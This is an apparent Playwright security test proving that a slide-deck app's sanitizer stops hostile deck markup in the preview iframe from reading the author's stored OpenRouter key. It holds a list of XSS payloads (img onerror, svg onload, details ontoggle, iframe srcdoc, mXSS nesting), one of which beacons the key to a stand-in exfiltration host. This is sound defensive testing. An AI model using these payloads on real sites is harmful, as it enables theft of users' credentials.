import { expect, gotoStudio, LIVE_PREVIEW, livePreview, test, typeDeck } from './studio-fixture';

// A SHARED DECK CANNOT READ THE AUTHOR'S OPENROUTER KEY.
//
// The preview frame is a same-origin, unsandboxed `srcdoc` iframe, and its CSP has no
// `script-src` (lib/core/subresource-csp.mjs). So the ONE thing between a hostile deck and
// `localStorage` — where the author's key lives — is `sanitizeSlideHtml`, which
// `single-slide-render.ts` runs on every slide before it enters the frame. A script that got
// through could read the key and send it anywhere: `top.location`, `parent.fetch`, a
// form post. This spec is the real-browser proof, and the evidence that it can fail: with
// `sanitizeOnce` returning its input unchanged, the test goes red — measured 2026-11-06, the
// event-handler vectors (img onerror, details ontoggle, iframe srcdoc, onerror after a
// <style>) read the key. The bare <script> vectors stay inert even unguarded, because the
// preview inserts markup through paths that do not run <script>; they are kept as a tripwire
// in case that ever changes. (engineering/decisions/2026-11-06-studio-byok-key-lifecycle.md §4, HARD RULE #22.)
//
// Each payload tries to append `<vector>:<key>` to `top.__byokLeak`, and the image vectors
// also try a beacon to an unroutable host. Typing the deck is how the markup arrives here; a
// deck opened from a share link or a `.lattice` file lands in the same renderer.

const SEEDED_KEY = 'sk-or-e2e-isolation-canary';
const leak = (tag: string) => `top.__byokLeak=(top.__byokLeak||[]).concat('${tag}:'+localStorage.getItem('lattice-db-or-key'))`;

const HOSTILE = [
	'# Isolation probe',
	'',
	'Probe body text.',
	'',
	`<script>${leak('script')}</script>`,
	'',
	`<img src="x" onerror="${leak('img-onerror')};new Image().src='https://exfil.invalid/?k='+localStorage.getItem('lattice-db-or-key')">`,
	'',
	`<svg onload="${leak('svg-onload')}"><circle r="1"/></svg>`,
	'',
	`<svg><script>${leak('svg-script')}</script></svg>`,
	'',
	`<details open ontoggle="${leak('details-ontoggle')}"><summary>s</summary>x</details>`,
	'',
	`<iframe srcdoc="<script>${leak('iframe-srcdoc').replace(/'/g, '&#39;')}</script>"></iframe>`,
	'',
	`<style>section{}</style><img src="x" onerror="${leak('after-style')}">`,
	'',
	`<object data="javascript:${leak('object')}"></object>`,
	'',
	// LAST: the unclosed mXSS nest swallows whatever follows it, so nothing may come after.
	`<math><mtext><table><mglyph><style><img src=x onerror="${leak('mxss')}">`,
].join('\n');

test('@smoke a hostile deck in the preview cannot read the stored OpenRouter key', async ({ page }) => {
	test.slow();
	const beacons: string[] = [];
	await page.route('https://exfil.invalid/**', async (route) => {
		beacons.push(route.request().url());
		await route.abort();
	});
	await page.addInitScript((key) => {
		try {
			localStorage.setItem('lattice-db-or-key', key);
		} catch {
			/* storage unavailable — the leak check below would pass vacuously, so the control catches it */
		}
	}, SEEDED_KEY);
	await gotoStudio(page);
	await typeDeck(page, HOSTILE);

	// Positive control: the hostile slide really rendered in the preview frame. Without this
	// a broken render would pass the leak check below for the wrong reason.
	await expect(livePreview(page).getByText('Isolation probe')).toBeVisible({ timeout: 30_000 });
	await expect(livePreview(page).getByText('Probe body text.')).toBeVisible();
	// The key is still there for the author's own surfaces.
	expect(await page.evaluate(() => localStorage.getItem('lattice-db-or-key'))).toBe(SEEDED_KEY);

	// Wait for the signal the handlers ride on: every image in the frame has settled (loaded or
	// failed), so an `onerror` that survived would already have run, then one frame for the
	// queued `toggle`/`load` events. Bounded by expect.poll's timeout, not a guessed sleep.
	const frame = page.locator(LIVE_PREVIEW).contentFrame();
	await expect.poll(() => frame.locator('img').evaluateAll((imgs) => imgs.every((i) => (i as HTMLImageElement).complete)), { timeout: 10_000 }).toBe(true);
	await frame.locator('body').evaluate(() => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r))));

	const leaked = await page.evaluate(() => (window as unknown as { __byokLeak?: string[] }).__byokLeak ?? []);
	expect(leaked, 'no payload in the deck should run in the preview frame').toEqual([]);
	expect(beacons, 'no payload should reach the beacon host').toEqual([]);
});
